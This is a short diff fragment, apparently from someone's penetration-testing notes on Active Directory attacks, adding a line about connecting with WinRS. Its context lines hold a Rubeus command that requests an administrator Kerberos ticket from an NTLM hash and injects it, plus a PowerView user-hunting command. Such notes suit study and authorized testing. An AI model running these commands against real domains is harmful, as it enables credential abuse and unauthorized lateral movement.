@@ -15,3 +15,4 @@ rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
 Find-DomainUserLocation
 ```
 ![[Pasted image 20231018164427.png]]
+Connect Using Win-rs
